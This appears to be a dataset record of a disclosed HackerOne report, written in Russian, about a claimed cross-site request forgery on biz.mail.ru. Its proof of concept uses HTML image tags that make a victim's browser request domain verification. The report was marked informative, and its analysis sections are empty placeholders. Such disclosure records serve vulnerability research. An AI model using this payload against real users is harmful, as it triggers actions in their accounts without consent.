---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '290023'
original_report_id: '290023'
title: CSRF на biz.mail.ru
weakness: Cross-Site Request Forgery (CSRF)
team_handle: mailru
created_at: '2017-11-14T06:54:17.563Z'
disclosed_at: '2018-07-16T15:40:57.740Z'
has_bounty: false
visibility: full
substate: informative
vote_count: 5
asset_identifier: biz.mail.ru
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF на biz.mail.ru

## Metadata

- HackerOne Report ID: 290023
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: mailru
- Disclosed At: 2018-07-16T15:40:57.740Z
- Has Bounty: No
- Visibility: full
- Substate: informative

## Original Report

Здравствуйте,
Я обнаружил CSRF на biz.mail.ru

PoC:
><img src="https://biz.mail.ru/verify/testtest111.com?edu" />
<img src="https://biz.mail.ru/verify/testtest112.com?edu" />
<img src="https://biz.mail.ru/verify/testtest113.com?edu" />
<img src="https://biz.mail.ru/verify/testtest114.com?edu" />

система думает что мы хотели добавить эти домены в свой аккаунт
через час мы получим майли:
"Нужна помощь с подтверждением домена *.com?"
F239336



Благодарю за внимание.
С уважением,
Джейхун Джафаров (c37hun)

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
